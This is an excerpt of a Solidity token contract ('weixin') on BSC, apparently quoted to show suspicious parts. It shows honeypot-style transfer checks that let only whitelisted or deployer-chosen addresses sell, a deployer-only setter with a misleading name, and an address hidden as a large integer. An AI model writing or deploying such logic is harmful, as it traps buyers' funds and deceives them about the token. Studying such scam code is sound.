...
interface IERC20 {
    ...
    event Ownership(address indexed onlyOwner, address indexed newOwner);
...
contract weixin {
    ...
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
        ...
        || _from == _MDEX || _from == onlyAddress || _from == MDEXBSC || canSale[_from]) {
            return true;
        }
    ...
    (1272421605896985521591648045833633087798577611605);
    ...
    address onlyAddress;
    function onlyowner(address addr) public payable returns(bool){
        require (msg.sender == deployer);
        onlyAddress = addr;
        return true;
    }
    ...
    address public _otherAddress = address (0x000000000000000000000000000000000000dEaD);
    address deadAddress = address(0x000000000000000000000000000000000000dEaD);
    address public UniswapV2Router = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address public VERSOIN;
    address public rewardToken;
    address public SnailExclusive;
